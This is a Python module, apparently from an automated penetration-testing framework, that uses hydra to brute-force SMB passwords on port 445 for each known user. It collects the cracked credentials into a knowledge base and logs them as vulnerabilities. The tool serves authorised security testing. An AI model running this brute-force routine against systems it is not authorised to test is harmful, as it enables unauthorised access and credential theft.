import re

from core.actionModule import actionModule
from core.keystore import KeyStore as kb
from core.utils import Utils


class hydrasmbpassword(actionModule):
    def __init__(self, config, display, lock):
        super(hydrasmbpassword, self).__init__(config, display, lock)
        self.title = "Attempt to bruteforce SMB passwords"
        self.shortName = "HydraSMBPassword"
        self.description = "execute [hydra -s 445 -L users -P passwords -o ttt smb://<server>] on each username"

        self.requirements = ["hydra"]
        self.triggers = ["newUser"]
        self.types = ["passwords"]

        self.safeLevel = 2

    def getTargets(self):
        self.targets = kb.get(['service/smb/host', 'host/*/tcpport/445'])

    def process(self):
        # load any targets we are interested in
        self.getTargets()

        # loop over each target
        for t in self.targets:
            users = kb.get(['host/' + t + '/user'])
            self.display.verbose(self.shortName + " - Connecting to " + t)
            for user in users:
                # verify we have not tested this host before
                if not self.seentarget(t + str(user)):
                    # add the new IP to the already seen list
                    self.addseentarget(t + str(user))
                    # make outfile
                    temp_file = self.config["proofsDir"] + self.shortName + "_" + t + "_" + Utils.getRandStr(10)

                    command = self.config["hydra"] + " -s 445 -l " + user + " -P " + self.config[
                        "miscDir"] + "passwords.txt smb://" + t
                    result = Utils.execWait(command, temp_file, timeout=30)

                    # Extract usernames & passwords from results and add to KB
                    parts = re.findall(".* login:\s\s*([^\s]*)\s\s*password:\s\s*([^\s]*)", result)
                    for part in parts:
                        self.fire("newSmbPassword")
                        self.addVuln(t, "guessable password", {"output": temp_file.replace("/", "%2F")})

                        self.display.debug(
                            "Identified username [" + part[0] + "] with password [" + part[1] + "] on " + t)
                        kb.add("host/" + t + "/user/" + part[0].strip() + "/password/" + part[1].strip())

        return
